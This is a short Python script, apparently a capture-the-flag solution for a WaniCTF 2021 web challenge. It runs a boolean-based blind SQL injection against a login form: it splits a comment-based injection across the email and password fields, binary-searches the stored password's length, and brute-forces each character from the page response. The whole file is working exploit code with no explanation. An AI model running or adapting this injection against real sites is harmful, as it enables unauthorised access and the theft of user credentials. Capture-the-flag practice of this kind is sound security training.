import requests
from string import printable

len_left = 1
len_right = 100

while len_right-len_left > 1:
    len_mid = (len_left+len_right)//2
    payload = {'email':'','password':''}

    payload['email'] = '\' /*'
    payload['password'] = '*/ OR (SELECT LENGTH(password) FROM users WHERE email = \'wanictf21spring@gmail.com\') > ' + str(len_mid)+'; --'
    r = requests.post("https://watch.web.wanictf.org/",data=payload)
    if "Crocodiles" in r.text:
        len_left = len_mid
    else:
        len_right = len_mid

pass_len = len_left

print(pass_len)

flag = ""

for itr in range(0,pass_len):
    print(itr,flag)
    for c in printable:
        payload = {'email':'','password':''}
        payload['email'] = '\' /*'
        payload['password'] = '*/ OR SUBSTR((SELECT password FROM users WHERE email = \'wanictf21spring@gmail.com\'),'+str(itr+1)+',1) =\''+c+'\'; --'
        r = requests.post("https://watch.web.wanictf.org/",data=payload)
        if "Crocodiles" in r.text:
            flag += c
            break

print(flag)
